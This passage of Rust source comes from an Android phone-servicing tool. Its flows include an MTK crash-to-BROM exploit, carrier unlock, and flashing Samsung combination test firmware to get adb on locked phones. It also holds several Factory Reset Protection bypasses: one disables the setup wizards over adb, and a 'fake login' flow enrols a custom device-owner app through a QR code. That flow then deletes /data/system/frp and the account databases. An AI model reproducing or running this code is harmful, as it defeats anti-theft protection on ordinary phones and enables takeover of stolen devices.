    out.push("CARRIER / SIM UNLOCK (AT chain, MTK)".to_string());
    match crate::at::at_carrier_unlock(&target, 4000) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  carrier unlock failed: {e}")),
    }
    Ok(())
}

/// `mtk_brom_info` — extended MTK detect (SoC, security config, identity).
pub fn flow_mtk_brom_info(out: &mut Vec<String>) -> Result<()> {
    out.push("MTK BROM INFO (extended detect)".to_string());
    match crate::mtk_da::mtk_detect_extended() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  mtk-detect-extended failed: {e}")),
    }
    Ok(())
}

/// `mtk_crash_brom` — crash a running preloader into held BROM
/// (test-point / preloader state → the state used for low-level ops).
pub fn flow_mtk_crash_brom(target: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MTK CRASH TO BROM".to_string());
    // target is 'bus:addr' (explicit) or the first preloader on the bus.
    let (bus, addr) = if !target.is_empty() && target.contains(':') {
        let loc: Vec<&str> = target.split(':').collect();
        match (loc.first(), loc.get(1)) {
            (Some(b), Some(a)) => match (b.parse::<u8>(), a.parse::<u8>()) {
                (Ok(b), Ok(a)) => (b, a),
                _ => return Err(BridgeError::InvalidArgument("bad bus:addr".to_string())),
            },
            _ => return Err(BridgeError::InvalidArgument("target must be 'bus:addr'".to_string())),
        }
    } else {
        let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
        let pre: Vec<_> = devices
            .iter()
            .filter(|d| d.vid == 0x0E8D && d.pid == 0x2000)
            .collect();
        if pre.is_empty() {
            out.push("  no preloader (0e8d:2000) on the bus - boot the phone with".to_string());
            out.push("  the preloader held (or plug it at test point) and rerun.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInPreloaderMode));
        }
        out.push(format!("  preloader at bus={} addr={}", pre[0].bus, pre[0].address));
        (pre[0].bus, pre[0].address)
    };
    match crate::mtk_exploit::preloader_crash_to_brom(bus, addr) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  crash failed: {e}")),
    }
    Ok(())
}

/// `qcom_verify` — verify Qualcomm partitions written earlier (read back +
/// compare; --partition = 'part=file,part=file').
pub fn flow_qcom_verify(target: &str, parts_spec: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QUALCOMM VERIFY-AFTER-WRITE".to_string());
    if parts_spec.is_empty() {
        out.push("  Set --partition 'part=file,part=file' (the partitions written".to_string());
        out.push("  earlier by qcom-flash).".to_string());
        return Err(BridgeError::InvalidArgument(
            "qcom_verify needs --partition 'part=file,...'".to_string(),
        ));
    }
    let mut entries: Vec<(String, String)> = Vec::new();
    for pair in parts_spec.split(',') {
        if let Some((part, file)) = pair.split_once('=') {
            entries.push((part.trim().to_string(), file.trim().to_string()));
        }
    }
    if entries.is_empty() {
        return Err(BridgeError::InvalidArgument(
            "bad --partition spec (want 'part=file,part=file')".to_string(),
        ));
    }
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
        let edl: Vec<_> = devices
            .iter()
            .filter(|d| d.vid == 0x05C6 && d.pid == 0x9008)
            .collect();
        if edl.is_empty() {
            out.push("  no EDL device (05c6:9008) on the bus.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "EDL (05c6:9008)".to_string(),
                actual: "no edl device".to_string(),
            }));
        }
        format!("{:04x}:{:04x}@{}:{}", edl[0].vid, edl[0].pid, edl[0].bus, edl[0].address)
    };
    match crate::qualcomm::qcom_verify_part_cli(&target, &entries) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  verify FAILED: {e}")),
    }
    Ok(())
}

/// `edl_detect` — watch/wait for the Qualcomm EDL device (05c6:9008).
pub fn flow_edl_detect(out: &mut Vec<String>) -> Result<()> {
    out.push("EDL DETECT — watch for 05c6:9008".to_string());
    out.push("  Power OFF, hold Vol Up + Vol Down, plug USB (hold 5s).".to_string());
    let deadline = Instant::now() + Duration::from_secs(60);
    while Instant::now() < deadline {
        if let Ok(devices) = crate::usb::collect_devices(None) {
            for d in &devices {
                if d.vid == 0x05C6 && d.pid == 0x9008 {
                    out.push(format!("  EDL device: {:04x}:{:04x} bus={} addr={}", d.vid, d.pid, d.bus, d.address));
                    return Ok(());
                }
            }
        }
        thread::sleep(Duration::from_millis(1200));
    }
    out.push("  no EDL device appeared within the wait window.".to_string());
    Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
        expected: "EDL (05c6:9008)".to_string(),
        actual: "no edl device".to_string(),
    }))
}

/// `apple_info` — Apple device info over usbmuxd/lockdown (read-only).
pub fn flow_apple_info(out: &mut Vec<String>) -> Result<()> {
    out.push("APPLE DEVICE INFO (read-only, EXPERIMENTAL)".to_string());
    match crate::apple::apple_info_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  apple-info failed: {e}")),
    }
    Ok(())
}

/// `pac_extract` — extract an SPD PAC container (--file = the .pac,
/// --partition = the out dir, default ./pac_extract).
pub fn flow_pac_extract(pac_path: &str, out_dir: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("PAC EXTRACT (SPD container)".to_string());
    let pac = if !pac_path.is_empty() {
        pac_path.to_string()
    } else {
        // Any .pac in ~/Downloads as the fallback.
        let dir = dirs_home_downloads();
        let mut found = String::new();
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_lowercase();
                if name.ends_with(".pac") {
                    found = e.path().to_string_lossy().to_string();
                    break;
                }
            }
        }
        if found.is_empty() {
            out.push("  No .pac found in ~/Downloads - re-run with --file <path>.".to_string());
            return Err(BridgeError::InvalidArgument("pac file required (--file <path>)".to_string()));
        }
        found
    };
    let out_dir = if out_dir.is_empty() { "./pac_extract".to_string() } else { out_dir.to_string() };
    out.push(format!("  Archive: {pac} -> {out_dir}"));
    match crate::pac::extract_cli(&pac, &out_dir) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  extract failed: {e}")),
    }
    Ok(())
}

/// `pac_pack` — pack a folder to a PAC container (--file = in dir,
/// --partition = out .pac).
pub fn flow_pac_pack(in_dir: &str, out_pac: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("PAC PACK (SPD container)".to_string());
    if in_dir.is_empty() || out_pac.is_empty() {
        out.push("  Set --file <in-dir> and --partition <out.pac>.".to_string());
        return Err(BridgeError::InvalidArgument(
            "pac_pack needs --file <in-dir> and --partition <out.pac>".to_string(),
        ));
    }
    match crate::pac::pack_cli(in_dir, out_pac, "PAC") {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  pack failed: {e}")),
    }
    Ok(())
}

/// `emmc_health` — eMMC/UFS health read (host-side info).
pub fn flow_emmc_health(out: &mut Vec<String>) -> Result<()> {
    out.push("eMMC / UFS HEALTH (host)".to_string());
    match crate::hostinfo::emmc_host_cli() {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  emmc-host failed: {e}")),
    }
    Ok(())
}

/// `qcn_backup` — Qualcomm modemst backup over EDL (Sahara/Firehose).
pub fn flow_qcn_backup(target: &str, programmer: &str, out_dir: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("QCN BACKUP (Qualcomm modemst1/2 over EDL)".to_string());
    let target_owned = target.to_string();
    let target = if !target_owned.is_empty() {
        target_owned
    } else {
        let devices = crate::usb::collect_devices(None).map_err(|e| BridgeError::Io(e.to_string()))?;
        let edl: Vec<_> = devices
            .iter()
            .filter(|d| d.vid == 0x05C6 && d.pid == 0x9008)
            .collect();
        if edl.is_empty() {
            out.push("  no EDL device (05c6:9008) on the bus - test-point EDL first.".to_string());
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "EDL (05c6:9008)".to_string(),
                actual: "no edl device".to_string(),
            }));
        }
        format!("{:04x}:{:04x}@{}:{}", edl[0].vid, edl[0].pid, edl[0].bus, edl[0].address)
    };
    out.push(format!("  Device: {target}"));
    match crate::qualcomm::qcom_backup(&target, programmer, out_dir) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  backup failed: {e}")),
    }
    Ok(())
}

/// `at_info` — MTP/diag target info (read-only).
pub fn flow_at_info(target: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("MTP / AT TARGET INFO (read-only)".to_string());
    let target = match resolve_fastboot_target(target, Duration::from_secs(30), out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "MTP/diag target".to_string(),
            actual: "no device".to_string(),
        })),
    };
    match crate::mtp::mtp_info(&target, 4000) {
        Ok(text) => {
            for line in text.lines() {
                out.push(format!("  {line}"));
            }
        }
        Err(e) => out.push(format!("  mtp-info failed: {e}")),
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Combo-firmware download-mode flows — the only way to get adb on a
// bootloader-LOCKED Samsung phone (A05/A06): flash a Samsung-signed
// COMBINATION test build via the native engine, then drive adb.
// ---------------------------------------------------------------------------

/// Find a combination firmware tar: COMBINATION_TAR env, ~/Downloads, cwd.
fn find_combo_tar(out: &mut Vec<String>) -> Option<String> {
    if let Some(env) = std::env::var_os("COMBINATION_TAR") {
        let p = env.to_string_lossy().to_string();
        if std::path::Path::new(&p).is_file() {
            return Some(p);
        }
    }
    for dir in [dirs_home_downloads(), std::path::PathBuf::from(".")] {
        if let Ok(entries) = std::fs::read_dir(&dir) {
            for e in entries.flatten() {
                let name = e.file_name().to_string_lossy().to_uppercase();
                if name.starts_with("COMBINATION") && (name.ends_with(".TAR") || name.ends_with(".TAR.MD5") || name.ends_with(".MD5")) {
                    return Some(e.path().to_string_lossy().to_string());
                }
            }
        }
    }
    out.push("  Combination firmware NOT FOUND. It is a Samsung-signed test".to_string());
    out.push("  build named like COMBINATION_A065F*...tar (A06) or".to_string());
    out.push("  COMBINATION_A055F*...tar (A05). Search the web for:".to_string());
    out.push("    'SM-A065F combination firmware' / 'A065F combination'".to_string());
    out.push("  (~2-4 GB download). Put it in ~/Downloads, or set".to_string());
    out.push("  COMBINATION_TAR=/path/to/file.tar, and rerun this method.".to_string());
    None
}

fn first_download_device(out: &mut Vec<String>) -> Option<String> {
    let devices = crate::usb::collect_devices(Some(0x04E8))
        .map_err(|e| BridgeError::Io(e.to_string()))
        .ok()?;
    let dl: Vec<_> = devices
        .iter()
        .filter(|d| crate::usb::SAMSUNG_ODIN_PIDS.contains(&d.pid))
        .collect();
    if dl.is_empty() {
        out.push("PHONE: enter download mode (power off, hold Volume Down + Power,".to_string());
        out.push("  then press Volume Up to the 'Downloading...' screen 04e8:685d),".to_string());
        out.push("  keep it plugged in.".to_string());
        return None;
    }
    let d = dl[0];
    Some(format!("{:04x}:{:04x}@{}:{}", d.vid, d.pid, d.bus, d.address))
}

/// Flash a combination firmware via the native engine, then wait for adb
/// (up to 3 min). Returns true once adb is online.
fn combo_flash_to_adb(purpose: &str, out: &mut Vec<String>) -> Result<bool> {
    out.push("FLASH COMBINATION FIRMWARE (download mode) - ".to_string() + purpose);
    out.push("  What this does: combo firmware (COMBINATION_A055F.../A065F...) is a".to_string());
    out.push("  Samsung-signed TEST build. Flashed into the AP slot it boots a debug".to_string());
    out.push("  Android with full adb on a bootloader-LOCKED phone - the only way to".to_string());
    out.push("  get adb on a locked A05/A06. (native Rust engine)".to_string());
    let combo = match find_combo_tar(out) {
        Some(c) => c,
        None => return Err(BridgeError::InvalidArgument("combination firmware not found".to_string())),
    };
    let target = match first_download_device(out) {
        Some(t) => t,
        None => return Err(BridgeError::DeviceState(crate::error::DeviceStateError::NotInDownloadMode)),
    };
    out.push(format!("  Odin target: {target}"));
    out.push(format!("  Firmware: {}", std::path::Path::new(&combo).file_name().and_then(|n| n.to_str()).unwrap_or("?")));
    out.push("  Flashing now via the native engine ... DO NOT unplug.".to_string());
    match crate::sam_download::odin_flash_tar(&target, &combo, false, true) {
        Ok(text) => {
            out.push("  Native smart flash finished (see transcript above).".to_string());
            let _ = text;
        }
        Err(e) => {
            out.push(format!("  flash failed: {e}"));
            return Err(BridgeError::Io(e.to_string()));
        }
    }
    out.push("  The phone reboots into the combination build. Waiting up to 3 min".to_string());
    out.push("  for adb...".to_string());
    if wait_authorized_adb("", Duration::from_secs(180), out).is_none() {
        out.push("  No adb device yet. The combo build may still be booting - watch".to_string());
        out.push("  the phone, then rerun 'Remove FRP' -> ADB when 'adb devices'".to_string());
        out.push("  shows it online.".to_string());
        return Ok(false);
    }
    Ok(true)
}

/// `download_frp` — download-mode FRP bypass: combo firmware (adb on a
/// locked phone), then the ADB FRP steps.
pub fn flow_download_frp(out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - DOWNLOAD MODE (combination firmware + adb clear)".to_string());
    let up = adb_authorized_row();
    if !up {
        if !combo_flash_to_adb("FRP bypass", out)? {
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "adb online after combo flash".to_string(),
                actual: "adb did not come up".to_string(),
            }));
        }
    }
    out.push("Clearing FRP / finishing setup over adb ...".to_string());
    let serial = wait_authorized_adb("", Duration::from_secs(30), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    let steps: &[(&str, &str)] = &[
        ("mark setup wizard run", "settings put global setup_wizard_has_run 1"),
        ("mark user setup complete", "settings put secure user_setup_complete 1"),
        ("mark device provisioned", "settings put global device_provisioned 1"),
        ("allow non-market apps", "settings put secure install_non_market_apps 1"),
        ("disable Google setup wizard", "pm disable-user --user 0 com.google.android.setupwizard"),
        ("disable Samsung setup wizard", "pm disable-user --user 0 com.sec.android.app.SecSetupWizard"),
        ("back to home", "am start -c android.intent.category.HOME -a android.intent.action.MAIN"),
    ];
    for (_, cmd) in steps {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_millis(1200));
    }
    out.push("Done. FRP cleared over adb.".to_string());
    Ok(())
}

/// `odin_enable_adb` — combo firmware (adb on a locked phone), then wait.
pub fn flow_odin_enable_adb(out: &mut Vec<String>) -> Result<()> {
    out.push("ENABLE ADB - DOWNLOAD MODE (combination firmware)".to_string());
    let up = adb_authorized_row();
    if !up {
        if !combo_flash_to_adb("get adb", out)? {
            return Err(BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
                expected: "adb online after combo flash".to_string(),
                actual: "adb did not come up".to_string(),
            }));
        }
    }
    out.push("ADB is online. You can now run: screen lock removal -> ADB, or".to_string());
    out.push("'Remove FRP -> ADB' (adb_frp).".to_string());
    Ok(())
}

/// `mtk_combo_flash` — flash a combination firmware on a MediaTek phone
/// (the A05/A06 download agent) via the native engine.
pub fn flow_mtk_combo_flash(out: &mut Vec<String>) -> Result<()> {
    out.push("MEDIATEK DOWNLOAD MODE - FLASH COMBINATION FIRMWARE".to_string());
    out.push("  Samsung A05/A06 (Helio G85) boot a proprietary MediaTek download".to_string());
    out.push("  agent; the native engine speaks it. Combo firmware is a".to_string());
    out.push("  Samsung-signed test build that boots with full adb on a locked".to_string());
    out.push("  phone, which is what actually clears FRP on the A05/A06.".to_string());
    combo_flash_to_adb("combo flash", out)?;
    Ok(())
}

/// `mtk_recovery_reset` — guided recovery factory reset (no PC needed;
/// clears the 'too many attempts / permanently locked' screen).
pub fn flow_mtk_recovery_reset(out: &mut Vec<String>) -> Result<()> {
    out.push("RECOVERY FACTORY RESET (clears lock / 'too many attempts')".to_string());
    out.push("  Works on any Samsung phone with no PC. The lock and its attempt".to_string());
    out.push("  counter live in /data, so wiping /data clears them.".to_string());
    out.push(String::new());
    out.push("  1. Power the phone off completely.".to_string());
    out.push("  2. Hold Volume Up + Power together.".to_string());
    out.push("  3. Keep holding until the Samsung logo appears; release Power but".to_string());
    out.push("     KEEP holding Volume Up until the recovery menu appears.".to_string());
    out.push("     (If you see 'No command', hold Power and press Volume Up once.)".to_string());
    out.push("  4. Volume keys: highlight 'Wipe data/factory reset' -> Power.".to_string());
    out.push("  5. Highlight 'Factory data reset' -> Power.".to_string());
    out.push("  6. Reboot system now -> Power.".to_string());
    out.push(String::new());
    out.push("  After the wipe the phone boots to setup with no lock. A Google".to_string());
    out.push("  account will stop at FRP - then use the FRP bypass tab.".to_string());
    Ok(())
}

// ---------------------------------------------------------------------------
// QR provisioning + MDM flows — Android Enterprise provisioning QRs (SVG,
// pure-Rust encoder) and the device-owner/DPC removal chains over ADB.
// ---------------------------------------------------------------------------

/// Build one Android Enterprise provisioning payload JSON (the same keys the
/// setup wizard scans): component + download location + skip flags.
fn qr_provisioning_payload(component: &str, url: &str, cert: &str) -> String {
    let mut payload = json!({
        "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT": component,
        "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": url,
        "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true,
        "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
        "android.app.extra.PROVISIONING_SKIP_EDUCATION_SCREENS": true,
    });
    if let Some(obj) = payload.as_object_mut() {
        if !cert.is_empty() {
            obj.insert(
                "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CERTIFICATE_HASH"
                    .to_string(),
                json!(cert),
            );
        }
        // Optional extras bundle (e.g. the access-email hint for our DPC):
        // FRP_DPC_EXTRAS_JSON must be a JSON object; merged key by key.
        let extras = std::env::var("FRP_DPC_EXTRAS_JSON").unwrap_or_default();
        if !extras.trim().is_empty() {
            if let Ok(serde_json::Value::Object(map)) = serde_json::from_str(&extras) {
                for (k, v) in map {
                    obj.insert(k, v);
                }
            }
        }
    }
    serde_json::to_string_pretty(&payload).unwrap_or_default()
}

/// Render one provisioning QR as an SVG file (+ the payload JSON next to it).
/// Returns the (name, svg_path) pair.
fn qr_emit_provisioning(
    component: &str,
    name: &str,
    out_dir: &std::path::Path,
    out: &mut Vec<String>,
) -> Result<(String, std::path::PathBuf)> {
    let pkg = component.split('/').next().unwrap_or("").to_string();
    let url = std::env::var("FRP_DPC_APK_URL")
        .unwrap_or_default()
        .trim()
        .to_string();
    let url = if url.is_empty() {
        format!("https://play.google.com/store/apps/details?id={pkg}")
    } else {
        url
    };
    let cert = std::env::var("FRP_DPC_CERT_HASH").unwrap_or_default().trim().to_string();
    let payload_json = qr_provisioning_payload(component, &url, &cert);

    let out_json = out_dir.join(format!("provisioning_{name}.json"));
    let out_svg = out_dir.join(format!("provisioning_qr_{name}.svg"));
    std::fs::write(&out_json, &payload_json).map_err(|e| BridgeError::Io(e.to_string()))?;
    let code = qrcode::QrCode::new(payload_json.as_bytes())
        .map_err(|e| BridgeError::Io(format!("qr encode failed: {e}")))?;
    let svg = code
        .render::<qrcode::render::svg::Color>()
        .quiet_zone(true)
        .build();
    std::fs::write(&out_svg, &svg).map_err(|e| BridgeError::Io(e.to_string()))?;
    out.push(format!(
        "  {name}:",
    ));
    out.push(format!("    json: {}", out_json.display()));
    out.push(format!("    qr (svg): {}", out_svg.display()));
    Ok((name.to_string(), out_svg))
}

/// `frp_qr_provision` — FRP bypass via setup-wizard QR provisioning
/// (Android 10-14): generate Test DPC device-owner QRs, guide the on-phone
/// enrollment, then clear FRP flags when ADB comes up.
pub fn flow_frp_qr_provision(serial_want: &str, out: &mut Vec<String>) -> Result<()> {
    out.push("FRP BYPASS - QR PROVISIONING (Android 10-14)".to_string());
    let out_dir = std::env::var("FRP_QR_OUT_DIR").unwrap_or_default();
    let out_dir = if out_dir.is_empty() {
        std::path::PathBuf::from("frp_qr")
    } else {
        std::path::PathBuf::from(out_dir)
    };
    std::fs::create_dir_all(&out_dir).map_err(|e| BridgeError::Io(e.to_string()))?;
    out.push(format!("Output: {}", out_dir.display()));
    out.push(String::new());
    let _ = qr_emit_provisioning(
        "com.afwserv.testdpc/.DeviceAdminReceiver",
        "frp_testdpc",
        &out_dir,
        out,
    )?;
    out.push(String::new());
    out.push("ON THE PHONE (at the Welcome / 'Verify your account' screen):".to_string());
    out.push("  1. Connect to Wi-Fi (provisioning downloads the DPC APK).".to_string());
    out.push("  2. Tap the screen 6 times in the same spot, or tap the QR button".to_string());
    out.push("     if the wizard shows one - the QR scanner opens.".to_string());
    out.push("  3. Scan the QR above from this PC's screen.".to_string());
    out.push("  4. Accept enrollment - Test DPC becomes device owner.".to_string());
    out.push("  5. In Test DPC: finish provisioning, then disable the setup".to_string());
    out.push("     wizard / complete setup - FRP is gone.".to_string());
    out.push(String::new());
    if adb_authorized_row() {
        out.push("If ADB becomes authorized, clearing FRP flags now ...".to_string());
        let serial = wait_authorized_adb(serial_want, Duration::from_secs(30), out);
        if let Some(serial) = serial {
            for (label, cmd) in [
                ("mark setup wizard run", "settings put global setup_wizard_has_run 1"),
                ("mark user setup complete", "settings put secure user_setup_complete 1"),
                ("mark device provisioned", "settings put global device_provisioned 1"),
            ] {
                adb_step(&serial, cmd, Duration::from_secs(30), out);
                let _ = label;
            }
        }
    } else {
        out.push("  (no ADB yet - the QR steps above are the way to go)".to_string());
    }
    out.push("Done. Reboot the device to complete setup.".to_string());
    Ok(())
}

/// `--dpc ours|testdpc|adp` CLI override; registry keys pin their own
/// default when the flag is absent. FRP_DPC_CHOICE env also honoured.
fn flow_dpc_choice(flag: &str, key_default: &str) -> String {
    let f = flag.trim().to_lowercase();
    if ["ours", "testdpc", "adp"].contains(&f.as_str()) {
        return f;
    }
    let e = std::env::var("FRP_DPC_CHOICE").unwrap_or_default().trim().to_lowercase();
    if ["ours", "testdpc", "adp"].contains(&e.as_str()) {
        return e;
    }
    key_default.to_string()
}

/// `frp_fake_login` — FRP bypass via setup-wizard QR provisioning with a
/// chosen DPC: `ours` (android/FlashPilotDPC, performs the fake login
/// itself), `testdpc` (Google's sample), or `adp` (Android Device Policy).
/// The QR enrolls the DPC as device owner; ours marks setup complete +
/// enables ADB by itself, then this flow clears the FRP flags once ADB is
/// authorized.
///
/// Inputs: `--file <apk>` (default per choice), `--dpc ours|testdpc|adp`;
/// FRP_DPC_APK_URL overrides the download URL; MDM_COMPONENT overrides the
/// component. Local APKs are served over the LAN automatically.
pub fn flow_frp_fake_login(
    serial_want: &str,
    file: &str,
    dpc: &str,
    out: &mut Vec<String>,
) -> Result<()> {
    out.push("FRP FAKE-LOGIN - DPC + QR PROVISIONING".to_string());
    out.push(format!("  DPC choice: {dpc}"));

    let (def_component, def_apk, qr_name, play_url) = match dpc {
        "testdpc" => (
            "com.afwserv.testdpc/.DeviceAdminReceiver",
            "mdm_qr/serve/testdpc.apk",
            "fakelogin_testdpc",
            "https://play.google.com/store/apps/details?id=com.afwserv.testdpc",
        ),
        "adp" => (
            "com.google.android.apps.work.oobconfig/.DevAdminReceiver",
            "",
            "fakelogin_adp",
            "https://play.google.com/store/apps/details?id=com.google.android.apps.work.oobconfig",
        ),
        _ => (
            "org.flashpilot.dpc/.FpAdminReceiver",
            "mdm_qr/serve/flashpilot-dpc.apk",
            "fakelogin",
            "",
        ),
    };
    let component = std::env::var("MDM_COMPONENT").unwrap_or_default().trim().to_string();
    let component = if component.is_empty() {
        def_component.to_string()
    } else {
        component
    };

    // Local APK when we have one (ours: required; testdpc: preferred with
    // Play fallback; adp: Play only).
    let apk = if !file.is_empty() {
        file.to_string()
    } else {
        std::env::var("FRP_DPC_APK").unwrap_or_default().trim().to_string()
    };
    let apk = if apk.is_empty() { def_apk.to_string() } else { apk };
    let have_apk = !apk.is_empty() && std::path::Path::new(&apk).is_file();
    if dpc == "ours" && !have_apk {
        out.push(format!("  APK not found: {apk}"));
        out.push("  Build it first: android/FlashPilotDPC/build.sh".to_string());
        out.push("  (needs ANDROID_SDK_ROOT with platforms;android-28 +".to_string());
        out.push("  build-tools;34.0.0), then re-run with --file <apk>.".to_string());
        return Err(BridgeError::InvalidArgument(format!("missing DPC apk: {apk}")));
    }

    // LAN IP for the download URL (the phone must share this Wi-Fi).
    let lan_ip = lan_ipv4().unwrap_or_else(|| "HOST_LAN_IP".to_string());
    let apk_name = std::path::Path::new(&apk)
        .file_name()
        .map(|s| s.to_string_lossy().to_string())
        .unwrap_or_else(|| "flashpilot-dpc.apk".to_string());
    let url = std::env::var("FRP_DPC_APK_URL").unwrap_or_default().trim().to_string();
    let url = if !url.is_empty() {
        url
    } else if have_apk {
        format!("http://{lan_ip}:8000/{apk_name}")
    } else {
        out.push("  (no local APK - falling back to the Play Store URL)".to_string());
        play_url.to_string()
    };
    let cert = if have_apk { dpc_cert_checksum_b64url(&apk) } else { String::new() };
    if have_apk && cert.is_empty() {
        out.push("  (no cert checksum - enrollment proceeds with a warning)".to_string());
    }

    // Extras bundle: ours pre-fills the access-email gate in the app.
    if dpc == "ours" {
        let mail = std::env::var("FP_ACCESS_EMAIL")
            .unwrap_or_default()
            .trim()
            .to_string();
        let mail = if mail.is_empty() { "flashpilot@local".to_string() } else { mail };
        std::env::set_var(
            "FRP_DPC_EXTRAS_JSON",
            format!("{{\"android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE\":{{\"fp_email\":\"{mail}\"}}}}"),
        );
    }

    let out_dir = std::path::PathBuf::from("mdm_qr");
    std::fs::create_dir_all(&out_dir).map_err(|e| BridgeError::Io(e.to_string()))?;
    // qr_emit_provisioning reads FRP_DPC_APK_URL / FRP_DPC_CERT_HASH /
    // FRP_DPC_EXTRAS_JSON.
    std::env::set_var("FRP_DPC_APK_URL", &url);
    if !cert.is_empty() {
        std::env::set_var("FRP_DPC_CERT_HASH", &cert);
    }
    let _ = qr_emit_provisioning(&component, qr_name, &out_dir, out)?;

    // Serve a local APK dir on :8000 (best-effort, reuses a live server,
    // then polls until it answers).
    if have_apk {
        serve_dir_best_effort(
            std::path::Path::new(&apk).parent().unwrap_or(std::path::Path::new(".")),
            8000,
            out,
        );
    }
    out.push(String::new());
    out.push("ON THE PHONE (setup wizard, same Wi-Fi as this PC):".to_string());
    out.push("  1. At the Welcome screen, tap the same spot 6 times fast -".to_string());
    out.push("     the QR scanner opens (do NOT press Next into the FRP login).".to_string());
    out.push("  2. Scan the QR above - the DPC installs as device owner.".to_string());
    if dpc == "ours" {
        out.push("  3. FlashPilot Setup completes setup + enables ADB by itself.".to_string());
        out.push("     (If it asks: enter the access email from the QR extras.)".to_string());
    } else {
        out.push("  3. In the DPC app: finish provisioning / complete setup.".to_string());
    }
    out.push("  4. Tap OK on the ADB authorization prompt when it appears.".to_string());
    out.push(String::new());
    out.push("Waiting for the authorized ADB session (up to 10 min) ...".to_string());
    let serial = wait_authorized_adb(serial_want, Duration::from_secs(600), out).ok_or_else(|| {
        BridgeError::DeviceState(crate::error::DeviceStateError::WrongMode {
            expected: "device (adb authorized)".to_string(),
            actual: "no adb device".to_string(),
        })
    })?;
    out.push("ADB authorized - clearing FRP ...".to_string());
    for (_, cmd) in [
        ("zero FRP secure flag", "settings put secure frp 0"),
        ("mark frp done", "settings put secure frp_done 1"),
        ("mark user setup complete", "settings put secure user_setup_complete 1"),
        ("mark device provisioned", "settings put global device_provisioned 1"),
        ("mark setup wizard run", "settings put global setup_wizard_has_run 1"),
        ("persisted FRP store", "rm -rf /data/system/frp"),
        ("persisted accounts (ce)", "rm -rf /data/system/accounts_ce.db"),
        ("persisted accounts (de)", "rm -rf /data/system/accounts_de.db"),
        ("disable Google setup wizard", "pm disable-user --user 0 com.google.android.setupwizard"),
        ("disable Moto setup wizard", "pm disable-user --user 0 com.motorola.setupwizard"),
        ("back to home", "am start -c android.intent.category.HOME -a android.intent.action.MAIN"),
    ] {
        adb_step(&serial, cmd, Duration::from_secs(30), out);
        thread::sleep(Duration::from_millis(1000));
    }
    out.push("Done. Reboot the phone - it should boot past FRP as a fresh device.".to_string());
    Ok(())
}

/// Best-effort LAN IPv4 for the provisioning download URL.
fn lan_ipv4() -> Option<String> {
    let text = std::process::Command::new("ip")
        .args(["route", "get", "1.1.1.1"])
        .output()
        .ok()
        .and_then(|o| String::from_utf8(o.stdout).ok())?;
    let mut it = text.split_whitespace();
    while let Some(w) = it.next() {
        if w == "src" {
            return it.next().map(|s| s.to_string());
        }
    }
    None
}

/// SHA-256 (base64url, no padding) of the APK's v1 signing certificate,
/// for PROVISIONING_DEVICE_ADMIN_PACKAGE_CERTIFICATE_HASH. Empty when the
/// APK has no v1 block or openssl/unzip are unavailable (optional field).
fn dpc_cert_checksum_b64url(apk: &str) -> String {
    use sha2::Digest;
    let rsa = match std::process::Command::new("unzip")
        .args(["-p", apk, "META-INF/*.RSA"])
        .output()
    {
        Ok(o) if o.status.success() && !o.stdout.is_empty() => o.stdout,
        _ => return String::new(),
    };
    // NOTE: openssl 3.0 ignores -outform DER on stdout (prints text);
    // DER is only honoured with -out <file>, so use a temp file.
    let tmp = std::env::temp_dir().join(format!("dpc-cert-{}.der", std::process::id()));
    let cert = match std::process::Command::new("openssl")
        .args(["pkcs7", "-inform", "DER", "-in", "/dev/stdin",
               "-print_certs", "-outform", "DER", "-out"])
        .arg(&tmp)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
    {
        Ok(mut child) => {
            use std::io::Write;
